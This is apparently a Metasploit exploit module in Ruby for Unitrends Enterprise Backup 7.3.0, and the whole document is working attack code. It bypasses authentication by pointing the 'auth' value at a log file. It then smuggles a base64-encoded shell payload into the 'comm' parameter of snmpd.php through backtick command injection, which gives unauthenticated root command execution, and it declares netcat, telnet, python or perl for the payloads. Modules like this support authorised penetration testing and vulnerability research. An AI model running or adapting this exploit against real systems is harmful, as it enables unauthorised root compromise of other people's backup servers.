require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Unitrends Unauthenticated Root RCE",
      'Description'    => %q{
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #discovery/metasploit module
        ],
      'References'     =>
        [
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Unitrends Enterprise Backup 7.3.0', {}]
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'python telnet netcat perl'
            }
        },
      'DisclosureDate' => "Mar 21 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),
        ], self.class)
  end

  def exploit

    pay = Rex::Text.encode_base64(payload.encoded)
    get = {
      'type' => 'update',
      'sid' => '1',
      'comm' => 'notpublic`echo '+pay+'|base64 --decode|sh`',
      'enabled' => '1',
      'rx' => '4335379',
      'ver' => '7.3.0',
      'gcv' => '0'
    }

    post = {
      'auth' => '1:/usr/bp/logs.dir/gui_root.log:100'
    }

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'recoveryconsole', 'bpl', 'snmpd.php'),
      'vars_get' => get,
      'vars_post' => post,
      'method' => 'POST'
    })

  end
end
